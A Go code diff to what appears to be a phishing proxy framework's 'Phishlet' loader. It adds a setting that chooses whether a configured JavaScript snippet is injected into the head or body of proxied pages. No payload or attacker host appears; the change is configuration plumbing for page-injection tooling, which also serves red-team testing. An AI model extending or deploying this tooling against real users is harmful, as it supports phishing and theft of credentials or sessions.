@@ -94,6 +94,7 @@ type JsInject struct {
 	trigger_domains []string         `mapstructure:"trigger_domains"`
 	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
 	trigger_params  []string         `mapstructure:"trigger_params"`
+	location        string           `mapstructure:"location"`
 	script          string           `mapstructure:"script"`
 }
 
@@ -207,6 +208,7 @@ type ConfigJsInject struct {
 	TriggerDomains *[]string `mapstructure:"trigger_domains"`
 	TriggerPaths   *[]string `mapstructure:"trigger_paths"`
 	TriggerParams  []string  `mapstructure:"trigger_params"`
+	Location       *string   `mapstructure:"location"`
 	Script         *string   `mapstructure:"script"`
 }
 
@@ -474,13 +476,20 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if js.Script == nil {
 				return fmt.Errorf("js_inject: missing `script` field")
 			}
+			location := "body"
+			if js.Location != nil {
+				if (*js.Location != "body" && *js.Location != "head") {
+					return fmt.Errorf("js_inject: unknown location - only 'head' or 'body' are supported")
+				}
+				location = p.paramVal(*js.Location)
+			}
 			for n := range *js.TriggerDomains {
 				(*js.TriggerDomains)[n] = p.paramVal((*js.TriggerDomains)[n])
 			}
 			for n := range *js.TriggerPaths {
 				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
 			}
-			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
+			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script), location)
 			if err != nil {
 				return err
 			}
@@ -807,7 +816,7 @@ func (p *Phishlet) GetLandingPhishHost() string {
 	return ""
 }
 
-func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
+func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, string, error) {
 	for _, js := range p.js_inject {
 		host_matched := false
 		for _, h := range js.trigger_domains {
@@ -847,12 +856,12 @@ func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[str
 							script = strings.Replace(script, "{"+k+"}", v, -1)
 						}
 					}
-					return js.id, script, nil
+					return js.id, script, js.location, nil
 				}
 			}
 		}
 	}
-	return "", "", fmt.Errorf("script not found")
+	return "", "", "", fmt.Errorf("script not found")
 }
 
 func (p *Phishlet) GetScriptInjectById(id string, params *map[string]string) (string, error) {
@@ -982,7 +991,7 @@ func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, h
 	return nil
 }
 
-func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string) error {
+func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string, location string) error {
 	js := JsInject{
 		id: GenRandomToken(),
 	}
@@ -1001,6 +1010,7 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 		js.trigger_params = append(js.trigger_params, strings.ToLower(d))
 	}
 	js.script = script
+	js.location = location
 
 	p.js_inject = append(p.js_inject, js)
 	return nil
